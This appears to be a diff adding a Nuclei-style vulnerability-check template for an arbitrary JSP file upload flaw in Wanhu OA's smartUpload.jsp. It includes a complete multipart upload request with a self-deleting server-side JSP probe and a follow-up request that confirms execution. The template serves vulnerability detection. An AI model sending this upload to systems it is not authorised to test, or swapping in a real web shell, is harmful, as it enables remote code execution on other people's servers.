@@ -1,0 +1,67 @@
+id: wanhu-smartupload-fileupload
+
+info:
+  name: Wanhub - Arbitrary File Upload
+  author: Co5mos
+  severity: critical
+  description: There is a file upload interface in the smartUpload.jsp file of Wanhu OA, and there is no filtering on the file type, which leads to arbitrary file upload vulnerability.
+  reference:
+    - https://peiqi.wgpsec.org/wiki/oa/%E4%B8%87%E6%88%B7OA/%E4%B8%87%E6%88%B7OA%20smartUpload.jsp%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    max-request: 2
+    fofa-query: app="万户网络-ezOFFICE"
+  tags: wanhu,fileupload
+
+variables:
+  filename: "{{rand_base(5)}}.jsp"
+
+http:
+  - raw:
+      - |
+        POST /defaultroot/extension/smartUpload.jsp?path=information&mode=add&fileName=infoPicName&saveName=infoPicSaveName&tableName=infoPicTable&fileMaxSize=0&fileMaxNum=0&fileType=gif,jpg,bmp,jsp,png&fileMinWidth=0&fileMinHeight=0&fileMaxWidth=0&fileMaxHeight=0 HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Upgrade-Insecure-Requests: 1
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundarynNQ8hoU56tfSwBVU
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
+        Connection: close
+
+        ------WebKitFormBoundarynNQ8hoU56tfSwBVU
+        Content-Disposition: form-data; name="photo"; filename="{{filename}}"
+        Content-Type: application/octet-stream
+
+        <% out.print(1111*2222);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>
+        ------WebKitFormBoundarynNQ8hoU56tfSwBVU
+        Content-Disposition: form-data; name="continueUpload"
+
+        1
+        ------WebKitFormBoundarynNQ8hoU56tfSwBVU
+        Content-Disposition: form-data; name="submit"
+
+        上传继续
+        ------WebKitFormBoundarynNQ8hoU56tfSwBVU--
+
+      - |
+        GET /defaultroot/upload/information/{{uploadfile}} HTTP/1.1
+        Host: {{Hostname}}
+    
+    extractors:
+      - type: regex
+        part: body
+        name: uploadfile
+        regex:
+          - '\d{25}\.jsp'
+        internal: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '2468642'
+
+      - type: status
+        status:
+          - 200
